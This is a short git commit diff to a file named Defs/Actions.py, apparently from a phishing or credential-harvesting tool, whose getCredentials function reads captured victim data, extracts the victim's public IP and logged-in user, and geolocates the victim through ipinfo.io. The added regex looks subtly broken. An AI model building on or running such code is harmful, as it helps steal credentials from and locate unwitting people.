c0e775b0881f702ba093f01853ca438125054bac
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-12-08 10:29:48 +0500

    Update Actions.py

--- Defs/Actions.py
+++ Defs/Actions.py
@@ -308,6 +308,7 @@ def getCredentials():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
+                user = re.match('Current logged in user: (a-z0-9)\n', lines)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
